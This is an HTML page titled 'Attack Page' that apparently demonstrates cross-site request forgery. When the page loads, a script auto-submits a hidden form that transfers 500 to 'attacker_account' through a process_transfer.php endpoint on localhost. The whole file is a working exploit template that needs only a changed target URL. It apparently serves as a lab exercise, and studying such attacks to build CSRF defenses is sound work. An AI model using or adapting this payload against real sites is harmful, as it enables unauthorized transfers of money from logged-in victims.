<!doctype html>
<html>
<head><title>Attack Page</title>
</head>
<body>
  <h1>Malicious attacker page</h1>
  <p>This page auto submits a hidden form to the vulnerable site to steal money .</p>

 
  <form id="attack" method="POST" action="http://localhost:8000/process_transfer.php">
    <input type="hidden" name="account" value="attacker_account">
    <input type="hidden" name="amount" value="500">
  </form>

  <script>
    
    document.getElementById('attack').submit();
  </script>
</body>
</html>
